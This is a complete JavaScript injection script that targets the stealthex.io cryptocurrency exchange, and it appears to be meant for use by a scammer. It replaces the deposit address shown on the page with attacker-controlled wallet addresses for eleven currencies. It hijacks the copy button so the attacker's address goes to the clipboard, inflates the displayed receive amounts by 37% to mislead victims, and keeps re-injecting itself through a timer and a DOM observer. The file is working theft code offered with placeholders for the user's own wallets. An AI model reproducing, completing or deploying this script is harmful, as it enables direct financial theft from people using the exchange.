(function() {
    // ===== CONFIGURATION – REPLACE WITH YOUR ADDRESSES =====
    const ADDRESSES = {
        btc: 'bc1q...your_btc_address',          // Bitcoin
        eth: '0x...your_eth_address',            // Ethereum
        xmr: '4...your_xmr_address',             // Monero
        trx: 'T...your_tron_address',            // TRON
        ltc: 'L...your_ltc_address',             // Litecoin
        sol: '9A5oG2fXhxpBnh9qVHVk3dxp4Up1gkp8q5vj5rwiUJr', // Solana
        usdt: 'T...your_usdt_trc20_address',     // Tether USD (TRC20)
        usdc: '0x...your_usdc_address',          // USD Coin (ERC20)
        zec: 't1...your_zec_address',            // Zcash
        xlm: 'G...your_xlm_address',             // Stellar
        xrp: 'r...your_xrp_address'              // XRP
    };
    const DEFAULT_ADDRESS = ADDRESSES.btc; // fallback if currency unknown
    const INFLATION_MULTIPLIER = 1.37; // 37% increase
    // ======================================================

    // Selectors
    const ADDRESS_SELECTOR = 'span[data-testid="exchange-address-from"]';
    const AMOUNT_FROM_SELECTOR = 'span[data-testid="exchange-amount-from"]'; // final page
    const CURRENCY_LABEL_SELECTOR = 'label[for="exchange-from-input"]';
    const CURRENCY_FALLBACK_SELECTOR = '#fromCryptoName, .crypto-name';
    const SEND_SELECTOR = 'input[data-testid="exchange-from-input"]';
    const AMOUNT_SELECTORS = [
        'input[data-testid="exchange-to-input"]',                 // first page
        'span.sc-4e739eed-8.dMXDfh',                              // second page
        'span[data-testid="exchange-amount-to"]'                  // final page (receive amount)
    ];
    // Copy button SVG selector (based on your provided element)
    const COPY_BUTTON_SELECTOR = 'svg.sc-be3d1b96-0.jwhJaF';

    if (!window.location.hostname.includes('stealthex.io')) return;

    const baselineMap = new WeakMap();
    let lastSendValue = null;

    // ----- Detect current send currency from multiple sources -----
    function getCurrentCurrency() {
        // 1. Try the "exchange-amount-from" span on final page
        const amountFrom = document.querySelector(AMOUNT_FROM_SELECTOR);
        if (amountFrom) {
            const text = amountFrom.textContent.trim();
            const match = text.match(/[A-Z]{3,5}$/);
            if (match) {
                const code = match[0].toLowerCase();
                if (code === 'btc') return 'btc';
                if (code === 'eth') return 'eth';
                if (code === 'xmr') return 'xmr';
                if (code === 'trx') return 'trx';
                if (code === 'ltc') return 'ltc';
                if (code === 'sol') return 'sol';
                if (code.includes('usdt')) return 'usdt';
                if (code === 'usdc') return 'usdc';
                if (code === 'zec') return 'zec';
                if (code === 'xlm') return 'xlm';
                if (code === 'xrp') return 'xrp';
            }
        }
        // 2. Try the label on first page
        const label = document.querySelector(CURRENCY_LABEL_SELECTOR);
        if (label) {
            let text = label.textContent.trim().replace(/^Send/i, '').trim().toLowerCase();
            if (text.includes('bitcoin')) return 'btc';
            if (text.includes('monero')) return 'xmr';
            if (text.includes('tron')) return 'trx';
            if (text.includes('litecoin')) return 'ltc';
            if (text.includes('solana')) return 'sol';
            if (text.includes('tether')) return 'usdt';
            if (text.includes('usd coin')) return 'usdc';
            if (text.includes('zcash')) return 'zec';
            if (text.includes('stellar')) return 'xlm';
            if (text.includes('xrp')) return 'xrp';
        }
        // 3. Fallback to crypto name element
        const fallbackEl = document.querySelector(CURRENCY_FALLBACK_SELECTOR);
        if (fallbackEl) {
            const fbText = fallbackEl.textContent.trim().toLowerCase();
            if (fbText.includes('btc')) return 'btc';
            if (fbText.includes('eth')) return 'eth';
            if (fbText.includes('xmr')) return 'xmr';
            if (fbText.includes('trx')) return 'trx';
            if (fbText.includes('ltc')) return 'ltc';
            if (fbText.includes('sol')) return 'sol';
            if (fbText.includes('usdt')) return 'usdt';
            if (fbText.includes('usdc')) return 'usdc';
            if (fbText.includes('zec')) return 'zec';
            if (fbText.includes('xlm')) return 'xlm';
            if (fbText.includes('xrp')) return 'xrp';
        }
        return null;
    }

    // ----- Reliable copy button hijacking using capturing event -----
    function setupCopyHijack() {
        // Use capturing phase to intercept clicks on the SVG before any site handler
        document.addEventListener('click', function(e) {
            // Check if the clicked element is the SVG or any of its children
            const target = e.target;
            const isCopyButton = target.closest(COPY_BUTTON_SELECTOR) !== null;
            if (!isCopyButton) return;

            // Stop the event completely
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation(); // Prevents any other listeners

            // Get the attacker address (already replaced)
            const addrEl = document.querySelector(ADDRESS_SELECTOR);
            if (addrEl && addrEl.textContent) {
                navigator.clipboard.writeText(addrEl.textContent).catch(() => {});
            }
        }, true); // true = capturing phase
    }

    // ----- Replace deposit address and update any hidden fields -----
    function replaceAddress() {
        const addrEl = document.querySelector(ADDRESS_SELECTOR);
        if (!addrEl) return;

        const currency = getCurrentCurrency();
        const attackerAddr = (currency && ADDRESSES[currency]) ? ADDRESSES[currency] : DEFAULT_ADDRESS;

        if (addrEl.textContent !== attackerAddr) {
            addrEl.textContent = attackerAddr;

            // Also update any hidden input that might store the address
            const hiddenInput = document.querySelector('input[type="hidden"][value*="' + addrEl.textContent + '"]');
            if (hiddenInput) hiddenInput.value = attackerAddr;
        }
    }

    // ----- Reset baselines when send amount changes -----
    function handleSendChange() {
        const sendInput = document.querySelector(SEND_SELECTOR);
        if (!sendInput) return;
        const currentSend = sendInput.value;
        if (currentSend !== lastSendValue) {
            AMOUNT_SELECTORS.forEach(selector => {
                document.querySelectorAll(selector).forEach(el => baselineMap.delete(el));
            });
            lastSendValue = currentSend;
        }
    }

    // ----- Inflate a single amount element -----
    function inflateElement(el) {
        if (!el) return;
        let fullText = (el.tagName === 'INPUT') ? el.value : el.textContent;
        if (!fullText) return;
        const match = fullText.match(/([\d.]+)/);
        if (!match) return;
        const originalNum = parseFloat(match[0]);
        if (isNaN(originalNum)) return;

        let baseline = baselineMap.get(el);
        if (baseline === undefined) {
            baseline = originalNum;
            baselineMap.set(el, baseline);
        }

        const inflatedNum = baseline * INFLATION_MULTIPLIER;
        const formatted = inflatedNum.toFixed(4);
        const newFullText = fullText.replace(match[0], formatted);

        if (el.tagName === 'INPUT') {
            if (el.value !== newFullText) {
                el.value = newFullText;
                el.setAttribute('value', newFullText);
            }
        } else {
            if (el.textContent !== newFullText) {
                el.textContent = newFullText;
            }
        }
    }

    function inflateAllAmounts() {
        AMOUNT_SELECTORS.forEach(selector => {
            document.querySelectorAll(selector).forEach(el => inflateElement(el));
        });
    }

    function injectAll() {
        handleSendChange();
        replaceAddress();
        inflateAllAmounts();
    }

    // Run immediately
    injectAll();

    // Setup copy hijack once
    setupCopyHijack();

    // Aggressive re-injection every 100ms
    setInterval(injectAll, 100);

    // Observe DOM changes
    const observer = new MutationObserver(injectAll);
    observer.observe(document.body, { childList: true, subtree: true });
})();